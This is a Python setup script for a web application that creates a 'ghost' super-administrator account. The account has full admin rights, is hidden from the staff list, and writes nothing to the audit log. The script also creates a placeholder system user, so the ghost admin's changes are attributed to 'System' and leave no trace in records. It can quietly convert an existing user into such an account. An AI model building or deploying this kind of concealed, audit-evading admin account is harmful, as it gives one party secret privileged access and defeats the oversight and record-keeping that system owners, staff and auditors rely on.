#!/usr/bin/env python3
"""
Create the super admin (ghost) account and the system placeholder user.

The super admin:
- Has role Admin (full access like any admin) but is_super_admin=True.
- Does not appear in the staff list (except when the super admin is logged in).
- Leaves no audit trail (no entries in audit_logs).
- All created_by/updated_by/etc. are stored as the system user, so no trace in records.

Run once after deployment. Requires is_super_admin column (run migrate_add_is_super_admin_mysql.py first).

Usage:
  python create_super_admin.py
  SUPER_ADMIN_USERNAME=ghost SUPER_ADMIN_PASSWORD=secret python create_super_admin.py

Environment:
  SUPER_ADMIN_USERNAME  (default: superadmin)  Username for the super admin account
  SUPER_ADMIN_PASSWORD  (optional)             Password; if not set, you will be prompted
  SUPER_ADMIN_FULL_NAME (default: Super Admin) Display name
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from app.core.database import SessionLocal
from app.core.security import get_password_hash
from app.models.user import User
from app.models.user_role import UserRole  # ensure relationship is resolvable


SYSTEM_USERNAME = "__system__"
DEFAULT_SUPER_ADMIN_USERNAME = "superadmin"
DEFAULT_SUPER_ADMIN_FULL_NAME = "Super Admin"


def ensure_is_super_admin_column(db):
    """Ensure users table has is_super_admin column (run migration if needed)."""
    from app.core.database import engine
    from sqlalchemy import text
    try:
        db_url = str(engine.url)
        is_mysql = "mysql" in db_url.lower() or "pymysql" in db_url.lower()
        is_sqlite = "sqlite" in db_url.lower()
        table_name = "users"
        column_name = "is_super_admin"
        with engine.connect() as conn:
            if is_mysql:
                result = conn.execute(
                    text("""
                        SELECT COUNT(*) FROM information_schema.COLUMNS
                        WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = :t AND COLUMN_NAME = :c
                    """),
                    {"t": table_name, "c": column_name},
                )
                exists = result.scalar() > 0
            else:
                result = conn.execute(text(f"PRAGMA table_info({table_name})"))
                exists = any(row[1] == column_name for row in result.fetchall())
            if not exists:
                if is_mysql:
                    conn.execute(text(
                        f"ALTER TABLE {table_name} ADD COLUMN {column_name} TINYINT(1) NOT NULL DEFAULT 0"
                    ))
                else:
                    conn.execute(text(
                        f"ALTER TABLE {table_name} ADD COLUMN {column_name} BOOLEAN NOT NULL DEFAULT 0"
                    ))
                conn.commit()
                print(f"Added column '{column_name}' to {table_name}")
    except Exception as e:
        print(f"Migration check failed: {e}")
        raise


def get_or_create_system_user(db) -> User:
    """Create the __system__ placeholder user if it does not exist (used for created_by when super admin acts)."""
    user = db.query(User).filter(User.username == SYSTEM_USERNAME).first()
    if user:
        return user
    # Create inactive system user; password is not used (account never logs in)
    system_user = User(
        username=SYSTEM_USERNAME,
        email=None,
        full_name="System",
        hashed_password=get_password_hash(os.urandom(32).hex()),
        role="Admin",
        is_active=False,
        is_super_admin=False,
    )
    db.add(system_user)
    db.commit()
    db.refresh(system_user)
    print(f"Created system placeholder user: {SYSTEM_USERNAME}")
    return system_user


def main():
    username = os.environ.get("SUPER_ADMIN_USERNAME", DEFAULT_SUPER_ADMIN_USERNAME).strip()
    full_name = os.environ.get("SUPER_ADMIN_FULL_NAME", DEFAULT_SUPER_ADMIN_FULL_NAME).strip()
    password = os.environ.get("SUPER_ADMIN_PASSWORD", "").strip()

    if not username:
        print("SUPER_ADMIN_USERNAME must be non-empty.")
        sys.exit(1)

    if not password:
        import getpass
        password = getpass.getpass("Super admin password: ")
        if not password:
            print("Password cannot be empty.")
            sys.exit(1)
        password_confirm = getpass.getpass("Confirm password: ")
        if password != password_confirm:
            print("Passwords do not match.")
            sys.exit(1)

    db = SessionLocal()
    try:
        ensure_is_super_admin_column(db)
        get_or_create_system_user(db)

        existing = db.query(User).filter(User.username == username).first()
        if existing:
            if getattr(existing, "is_super_admin", False):
                print(f"Super admin user '{username}' already exists. Nothing to do.")
            else:
                # Convert existing user to super admin
                existing.is_super_admin = True
                existing.hashed_password = get_password_hash(password)
                existing.full_name = full_name or existing.full_name
                db.commit()
                print(f"Updated existing user '{username}' to super admin and set new password.")
            return

        super_admin = User(
            username=username,
            email=None,
            full_name=full_name,
            hashed_password=get_password_hash(password),
            role="Admin",
            is_active=True,
            is_super_admin=True,
        )
        db.add(super_admin)
        db.commit()
        db.refresh(super_admin)
        print(f"Super admin account created: username={username}, role=Admin, is_super_admin=True")
        print("This account will not appear in the staff list (except when logged in), will leave no audit trail, and created_by/updated_by will be stored as System.")
    finally:
        db.close()


if __name__ == "__main__":
    main()
